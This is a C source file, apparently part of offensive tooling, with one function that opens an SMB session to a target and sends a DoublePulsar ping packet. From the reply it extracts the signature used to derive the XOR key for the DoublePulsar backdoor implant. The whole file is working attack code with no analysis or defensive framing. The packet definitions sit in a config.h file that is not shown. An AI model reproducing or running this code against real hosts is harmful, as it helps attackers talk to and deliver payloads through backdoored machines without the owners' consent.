#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "config.h"

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 0;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 0;
    }

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &serverAddr.sin_addr) <= 0) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    uint8_t negotiate_buf[sizeof(SMB_NEGOTIATE_PKT)];
    memcpy(negotiate_buf, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT));
    if (send(sock, (char*)negotiate_buf, sizeof(SMB_NEGOTIATE_PKT) - 1, 0) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    uint8_t response_negotiate[1024];
    int bytes_received = recv(sock, (char*)response_negotiate, sizeof(response_negotiate), 0);
    if (bytes_received <= 0) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    uint8_t session_setup_buf[sizeof(SMB_SESSION_SETUP_PKT)];
    memcpy(session_setup_buf, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT));
    if (send(sock, (char*)session_setup_buf, sizeof(SMB_SESSION_SETUP_PKT) - 1, 0) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    uint8_t response_session[1024];
    bytes_received = recv(sock, (char*)response_session, sizeof(response_session), 0);
    if (bytes_received <= 0) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }
    if (bytes_received < 34) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }
    uint16_t user_id = *(uint16_t*)(response_session + 32);

    uint8_t tree_connect_buf[sizeof(SMB_TREE_CONNECT_PKT)];
    memcpy(tree_connect_buf, SMB_TREE_CONNECT_PKT, sizeof(SMB_TREE_CONNECT_PKT));
    *(uint16_t*)(tree_connect_buf + 32) = user_id;
    if (send(sock, (char*)tree_connect_buf, sizeof(SMB_TREE_CONNECT_PKT) - 1, 0) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    uint8_t response_tree[1024];
    bytes_received = recv(sock, (char*)response_tree, sizeof(response_tree), 0);
    if (bytes_received <= 0) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }
    if (bytes_received < 34) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }
    uint16_t tree_id = *(uint16_t*)(response_tree + 28);
    uint16_t user_id_tree = *(uint16_t*)(response_tree + 32);

    uint8_t dp_ping_buf[sizeof(DP_PING_PKT)];
    memcpy(dp_ping_buf, DP_PING_PKT, sizeof(DP_PING_PKT));
    *(uint16_t*)(dp_ping_buf + 28) = tree_id;
    *(uint16_t*)(dp_ping_buf + 32) = user_id_tree;
    if (send(sock, (char*)dp_ping_buf, sizeof(DP_PING_PKT) - 1, 0) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    uint8_t response_dp[1024];
    bytes_received = recv(sock, (char*)response_dp, sizeof(response_dp), 0);
    if (bytes_received <= 0) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }
    if (bytes_received < (SMB_RESP_SIGNATURE_END + 1)) {
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    uint32_t signature = 0;
    for (int i = 0; i < 4; i++) {
        signature |= (uint32_t)response_dp[SMB_RESP_SIGNATURE_START + i] << (i * 8);
    }

    closesocket(sock);
    WSACleanup();
    return (unsigned int)signature;
}